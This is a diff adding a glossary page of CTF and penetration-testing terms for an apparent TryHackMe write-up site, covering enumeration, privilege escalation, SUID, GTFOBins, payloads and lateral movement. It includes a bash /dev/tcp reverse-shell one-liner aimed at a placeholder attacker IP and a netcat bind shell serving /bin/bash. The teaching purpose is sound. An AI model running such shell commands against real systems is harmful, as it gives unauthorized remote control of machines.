@@ -1,0 +1,189 @@
+---
+title: "CTF Terminology — Key Terms and Concepts Explained"
+sidebarTitle: "Terminology"
+description: "Glossary of common CTF and penetration testing terms used throughout these writeups, from attack vectors to privilege escalation concepts."
+---
+
+Security and CTF communities have a dense vocabulary that can make writeups impenetrable if you are new to the field. This glossary defines every key term used across these writeups in plain language, so you can focus on the techniques rather than decoding the jargon. Terms are grouped alphabetically within the accordion below — expand any entry for a full explanation and relevant context.
+
+<AccordionGroup>
+  <Accordion title="CTF (Capture the Flag)" icon="flag">
+    A **Capture the Flag** competition is a cybersecurity challenge format in which participants solve security puzzles to retrieve hidden strings called "flags." Flags are typically formatted as a token (e.g., `THM{s0m3_r4nd0m_string}`) and serve as proof that a challenge has been solved.
+
+    There are two primary CTF formats:
+    - **Jeopardy-style** — independent challenges across categories (web, crypto, forensics, reverse engineering, pwn). Each solved challenge yields a flag worth a set number of points.
+    - **Attack/Defense** — teams run live services and simultaneously attack opponents while defending their own infrastructure.
+
+    TryHackMe uses a guided, jeopardy-adjacent format where each "room" is a self-contained challenge environment with specific learning objectives and flags to find.
+  </Accordion>
+
+  <Accordion title="TryHackMe" icon="shield-halved">
+    [TryHackMe](https://tryhackme.com) is a browser-accessible cybersecurity training platform that hosts guided learning paths and CTF-style challenge rooms. Each room deploys a real virtual machine in the cloud that you attack over a VPN connection.
+
+    Key features:
+    - **Rooms** — individual challenge environments covering topics from basic Linux commands to advanced Active Directory exploitation
+    - **Learning Paths** — curated sequences of rooms for structured skill development
+    - **AttackBox** — a browser-based Kali Linux instance you can use without setting up your own VM
+    - **OpenVPN** — connect your own machine to the TryHackMe network using a provided `.ovpn` config file
+
+    Difficulty ratings range from Easy to Insane. All writeups on this site are TryHackMe rooms.
+  </Accordion>
+
+  <Accordion title="Attack Surface" icon="crosshairs">
+    The **attack surface** of a system is the total set of points where an attacker could attempt to enter, extract data, or cause harm. Every open port, exposed service, publicly accessible web page, and accepted user input is part of the attack surface.
+
+    Reducing attack surface is a core principle of hardening — the fewer entry points a system exposes, the harder it is to compromise. In a CTF context, mapping the attack surface during reconnaissance directly tells you where to focus your exploitation efforts. A machine with only port 22 (SSH) and port 80 (HTTP) exposed has a much smaller attack surface than one with a dozen open ports.
+  </Accordion>
+
+  <Accordion title="Enumeration" icon="list-magnifying-glass">
+    **Enumeration** is the process of systematically extracting detailed information from discovered services, systems, and applications. It goes beyond simply knowing that a service exists — enumeration means learning *what version* it is, *how it's configured*, *what users exist*, and *what resources are accessible*.
+
+    Examples:
+    - Discovering that port 80 is open is **reconnaissance**
+    - Finding that it runs Apache 2.4.49, hosts a login page at `/admin`, and returns directory listings is **enumeration**
+
+    Thorough enumeration is the single most important phase of a CTF. Most flags are won or lost here, not during exploitation.
+  </Accordion>
+
+  <Accordion title="Reverse Shell" icon="arrow-turn-down-left">
+    A **reverse shell** is a remote shell connection in which the **target machine initiates the connection back to the attacker's machine**. The attacker runs a listener (e.g., `nc -lvnp 4444`) and the target calls out to it after a payload is executed.
+
+    This technique bypasses many firewalls because outbound connections from the target are typically less restricted than inbound ones.
+
+    Common reverse shell one-liner (bash):
+    ```bash
+    bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
+    ```
+
+    Reverse shells are the most common shell type used in TryHackMe rooms.
+  </Accordion>
+
+  <Accordion title="Bind Shell" icon="arrow-turn-up-right">
+    A **bind shell** is the inverse of a reverse shell. Rather than the target calling back to the attacker, the **target opens a port and listens**, waiting for the attacker to connect to it.
+
+    ```bash
+    # On the target — open a bind shell on port 4444
+    nc -lvnp 4444 -e /bin/bash
+
+    # On the attacker machine — connect to it
+    nc <TARGET_IP> 4444
+    ```
+
+    Bind shells are less commonly used in CTFs because targets are often behind firewalls that block inbound connections to arbitrary ports. They are more useful in scenarios where the attacker cannot receive inbound traffic (e.g., behind NAT without port forwarding).
+  </Accordion>
+
+  <Accordion title="Privilege Escalation (PrivEsc)" icon="arrow-up-right-dots">
+    **Privilege escalation** is the process of gaining higher system permissions than those initially obtained. In practice, this typically means moving from a low-privilege user account to **root** on Linux or **SYSTEM/Administrator** on Windows.
+
+    There are two types:
+    - **Vertical PrivEsc** — escalating from a lower-privilege user to a higher one (user → root)
+    - **Horizontal PrivEsc** — moving laterally to another account at the same privilege level (often to access that user's files or reuse their credentials for vertical escalation)
+
+    Common PrivEsc vectors include misconfigured sudo rules, SUID binaries, writable cron jobs, weak file permissions, kernel exploits, and stored credentials.
+  </Accordion>
+
+  <Accordion title="SUID (Set User ID)" icon="user-lock">
+    **SUID** is a Unix file permission bit that causes an executable to run with the permissions of its **owner** rather than the user executing it. If a binary is owned by root and has the SUID bit set, it runs as root regardless of who launches it.
+
+    Legitimate uses exist (e.g., `passwd` needs root access to write to `/etc/shadow`), but SUID binaries that can be abused — such as those that spawn shells or read arbitrary files — are a major privilege escalation vector.
+
+    ```bash
+    # Find all SUID binaries on the system
+    find / -perm -4000 -type f 2>/dev/null
+    ```
+
+    Cross-reference any results against [GTFOBins](https://gtfobins.github.io/#+suid) for known exploitation methods.
+  </Accordion>
+
+  <Accordion title="GTFOBins" icon="book-skull">
+    [**GTFOBins**](https://gtfobins.github.io) ("Get The F*** Out Binaries") is a community-curated list of Unix system binaries that can be exploited to bypass local security restrictions. It covers scenarios including:
+
+    - **Shell** — spawning an interactive shell from a binary
+    - **Sudo** — exploiting a `sudo` permission on a binary to escalate privileges
+    - **SUID** — abusing the SUID bit on a binary
+    - **File read/write** — using a binary to read sensitive files or write to protected paths
+    - **Reverse shell** — turning a binary into a reverse shell launcher
+
+    GTFOBins is one of the most frequently referenced resources in these writeups. After running `sudo -l` or finding SUID binaries, check GTFOBins before doing anything else.
+  </Accordion>
+
+  <Accordion title="Payload" icon="bomb">
+    A **payload** is the component of an exploit that performs the intended malicious action. When you exploit a vulnerability, you typically need two things: the delivery mechanism (the exploit) and the payload (what actually runs on the target).
+
+    Common payload types in CTFs:
+    - **Reverse shell payload** — causes the target to connect back to your listener
+    - **Web shell payload** — a script uploaded to a web server that accepts commands via HTTP
+    - **Staged payload** — a small initial payload that downloads and executes a larger second-stage payload (common in Metasploit)
+    - **Stageless payload** — the entire payload in a single self-contained binary
+
+    Metasploit's `msfvenom` is the standard tool for generating custom payloads in various formats.
+  </Accordion>
+
+  <Accordion title="Foothold" icon="shoe-prints">
+    A **foothold** refers to your first point of access on a target system — typically a low-privilege shell or user session. Achieving a foothold means you have successfully exploited a vulnerability and established some form of execution on the target, even if your permissions are severely limited.
+
+    The foothold is the entry point for all subsequent post-exploitation and privilege escalation activity. In TryHackMe rooms, gaining a foothold usually unlocks the user flag and sets up the PrivEsc challenge.
+  </Accordion>
+
+  <Accordion title="Lateral Movement" icon="arrow-right-arrow-left">
+    **Lateral movement** is the technique of using a compromised system as a stepping stone to gain access to other machines or accounts within the same network. Rather than escalating privileges on the current host, lateral movement expands your reach across the environment.
+
+    Common lateral movement techniques:
+    - **Pass-the-Hash** — using a captured NTLM hash to authenticate to other Windows machines without knowing the plaintext password
+    - **SSH key reuse** — private keys found on one box used to log into others
+    - **Credential spraying** — trying discovered passwords against other services and accounts
+    - **Pivoting** — routing your attack traffic through a compromised host to reach otherwise inaccessible network segments
+
+    Lateral movement is primarily relevant in network-level TryHackMe rooms and Active Directory challenges.
+  </Accordion>
+
+  <Accordion title="Root Flag / User Flag" icon="flag-checkered">
+    On TryHackMe, **flags** are proof-of-compromise files that you submit to earn points and complete room objectives.
+
+    - **User flag** — located in the home directory of a non-root user, typically at `/home/<username>/user.txt`. Retrieving it confirms you have achieved a foothold and can read files as that user.
+    - **Root flag** — located at `/root/root.txt`. Retrieving it confirms you have successfully escalated to root privileges.
+
+    ```bash
+    cat /home/<username>/user.txt
+    cat /root/root.txt
+    ```
+
+    Some rooms hide flags in non-standard locations or require additional steps (decoding, combining partial flags). Read each task description carefully.
+  </Accordion>
+
+  <Accordion title="Wordlist" icon="list">
+    A **wordlist** is a text file containing a list of strings used as inputs to brute-force attacks. Depending on the context, a wordlist might contain:
+
+    - **Passwords** — for credential brute-forcing against SSH, FTP, web login forms, etc.
+    - **Directory/file names** — for web content discovery with `gobuster` or `feroxbuster`
+    - **Usernames** — for user enumeration or credential spraying
+    - **Subdomains** — for DNS subdomain enumeration
+
+    The most widely used wordlist collection is [**SecLists**](https://github.com/danielmiessler/SecLists), maintained by Daniel Miessler. On Kali Linux, it is available at `/usr/share/seclists/`. The classic `rockyou.txt` password list (14 million passwords) is at `/usr/share/wordlists/rockyou.txt`.
+  </Accordion>
+
+  <Accordion title="CVE (Common Vulnerabilities and Exposures)" icon="triangle-exclamation">
+    **CVE** is a standardized naming system for publicly disclosed cybersecurity vulnerabilities. Each CVE entry is assigned a unique identifier in the format `CVE-YEAR-NUMBER` (e.g., `CVE-2021-44228` for Log4Shell).
+
+    CVEs are published in the [National Vulnerability Database (NVD)](https://nvd.nist.gov) and include:
+    - A description of the vulnerability
+    - Affected software versions
+    - A CVSS severity score (0–10)
+    - References to patches and advisories
+
+    In CTF contexts, identifying the exact version of a service during enumeration often maps directly to a known CVE. Searching `searchsploit` or Exploit-DB for that CVE number will frequently yield a ready-to-use exploit.
+  </Accordion>
+</AccordionGroup>
+
+---
+
+## Keep Exploring
+
+<CardGroup cols={2}>
+  <Card title="Methodology" icon="map" href="/reference/methodology">
+    A structured step-by-step approach to attacking CTF machines from recon to flag capture.
+  </Card>
+  <Card title="Tools Reference" icon="wrench" href="/reference/tools">
+    Commands and usage notes for every tool referenced in these writeups.
+  </Card>
+</CardGroup>
